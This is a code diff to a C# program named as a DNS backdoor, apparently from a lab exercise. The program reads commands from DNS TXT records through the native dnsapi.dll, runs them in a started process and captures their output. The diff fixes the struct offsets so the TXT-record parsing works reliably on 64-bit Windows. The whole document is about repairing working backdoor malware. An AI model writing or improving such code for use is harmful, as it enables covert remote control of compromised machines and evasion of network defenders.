@@ -13,6 +13,28 @@ namespace A06_6_DNS_Backdoor
         private const ushort DNS_TYPE_TEXT = 0x0010;
         private const uint DNS_QUERY_STANDARD = 0x00000000;
 
+        // RESTORED STRUCT: Custom structure definition matching native Windows text mappings
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct DNS_TXT_DATA
+        {
+            public uint dwStringCount;
+            public IntPtr pStringArray;
+        }
+
+        // RESTORED STRUCT: Core structure description template parsed by Marshal.OffsetOf
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct DNS_RECORD
+        {
+            public IntPtr pNext;
+            public string pName;
+            public ushort wType;
+            public ushort wDataLength;
+            public uint flags;
+            public uint dwTtl;
+            public uint dwReserved;
+            public DNS_TXT_DATA Data;
+        }
+
         [DllImport("dnsapi.dll", CharSet = CharSet.Unicode, EntryPoint = "DnsQuery_W")]
         private static extern int DnsQuery(
             string pszName,
@@ -109,7 +131,6 @@ namespace A06_6_DNS_Backdoor
                     proc.Start();
 
                     Console.WriteLine("[*] Reading StandardOutput stream content...");
-                    // Read the content fully. If the command runs indefinitely or stalls, this line hangs.
                     string output = proc.StandardOutput.ReadToEnd();
                     Console.WriteLine($"[+] Stream read complete. Bytes read: {output.Length}");
 
@@ -174,7 +195,9 @@ namespace A06_6_DNS_Backdoor
 
                     if (recordType == DNS_TYPE_TEXT)
                     {
-                        IntPtr pStringArrayBase = IntPtr.Add(pResultList, 52);
+                        // Calculate the dynamic structure offsets cleanly to preserve 64-bit stability
+                        int dataOffset = (int)Marshal.OffsetOf<DNS_RECORD>("Data");
+                        IntPtr pStringArrayBase = IntPtr.Add(pResultList, dataOffset + 8);
 
                         if (pStringArrayBase != IntPtr.Zero)
                         {
@@ -192,16 +215,13 @@ namespace A06_6_DNS_Backdoor
                 }
                 else
                 {
-                    Console.WriteLine($"[-] DnsQuery API returned non-zero status or null pointer list. Win32 Status Code: {status}");
+                    Console.WriteLine($"[-] DnsQuery API returned non-zero status. Win32 Status Code: {status}");
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[-] Unhandled Exception encountered inside FetchNativeTxtRecord memory translation: {ex.Message}");
-                if (pResultList != IntPtr.Zero)
-                {
-                    DnsRecordListFree(pResultList, 0);
-                }
+                Console.WriteLine($"[-] Exception during memory translation: {ex.Message}");
+                if (pResultList != IntPtr.Zero) DnsRecordListFree(pResultList, 0);
             }
             return null;
         }
